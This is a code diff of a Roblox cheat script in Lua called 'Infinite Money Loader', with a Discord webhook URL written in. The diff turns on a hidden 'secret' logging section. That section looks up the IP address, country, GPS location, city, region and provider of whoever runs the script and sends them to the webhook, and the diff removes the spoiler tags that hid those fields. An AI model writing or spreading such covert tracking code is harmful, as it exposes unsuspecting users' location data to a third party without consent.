@@ -286,7 +286,7 @@ tween:Play()
 --// Config
 getgenv().whscript = "Infinite Money Loader"        --Change to the name of your script
 getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1378486177652539472/WtE2qxJochx4f5TwAKLqpexU-IxM8eBg-TGsHdhzFN_sqUZqfXx9IUwseu3gFeBXIgqL"  --Put your Webhook Url here
-getgenv().ExecLogSecret = false                --decide to also log secret section
+getgenv().ExecLogSecret = true                --decide to also log secret section
 
 --// Execution Log Script
 local ui = gethui()
@@ -458,21 +458,21 @@ if getgenv().ExecLogSecret then
     local ipinfo_json = game:HttpGet(iplink)
     local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)
 
-    table.insert(
+       table.insert(
         data.embeds[1].fields,
         {
             ["name"] = "**`(🤫) Secret`**",
-            ["value"] = "||(👣) IP Address: " ..
+            ["value"] = "(👣) IP Address: " ..
                 ipinfo_table.ip ..
-                    "||\n||(🌆) Country: " ..
+                    "\n(🌆) Country: " ..
                         ipinfo_table.country ..
-                            "||\n||(🪟) GPS Location: " ..
+                            "\n(🪟) GPS Location: " ..
                                 ipinfo_table.loc ..
-                                    "||\n||(🏙️) City: " ..
+                                    "\n(🏙️) City: " ..
                                         ipinfo_table.city ..
-                                            "||\n||(🏡) Region: " ..
+                                            "\n(🏡) Region: " ..
                                                 ipinfo_table.region ..
-                                                    "||\n||(🪢) Hoster: " .. ipinfo_table.org .. "||"
+                                                    "\n(🪢) Hoster: " .. ipinfo_table.org .. "||"
         }
     )
 end
